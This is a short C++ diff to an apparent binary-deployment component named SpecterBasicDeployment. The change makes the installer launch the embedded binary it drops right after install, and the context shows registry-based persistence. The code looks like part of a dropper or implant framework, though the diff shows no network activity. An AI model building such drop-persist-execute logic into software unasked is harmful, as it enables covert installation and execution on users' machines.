@@ -2,6 +2,7 @@
 #include "SpecterLib/SyscallException.h"
 #include "SpecterLib/CommonPaths.h"
 #include "SpecterLib/ResourceUtils.h"
+#include "SpecterLib/ProcessUtils.h"
 #include "resource.h"
 
 #include <fstream>
@@ -46,6 +47,7 @@ bool SpecterBasicDeployment::Install()
 			return false;
 		}
 
+		RunBinary();
 		return true;
 	}
 	catch (const std::exception&)
@@ -68,7 +70,7 @@ bool SpecterBasicDeployment::DeployBinary() const
 		return false;
 	}
 
-	std::ofstream output_stream(m_target_file);
+	std::ofstream output_stream(m_target_file, std::ios::binary);
 	if (!output_stream.is_open())
 	{
 		return false;
@@ -81,4 +83,9 @@ bool SpecterBasicDeployment::DeployBinary() const
 void SpecterBasicDeployment::DisablePersistence()
 {
 	m_reg_key.DeleteValue(m_program_name);
+}
+
+void SpecterBasicDeployment::RunBinary() const
+{
+	ProcessUtils::RunProcess(m_target_file);
 }
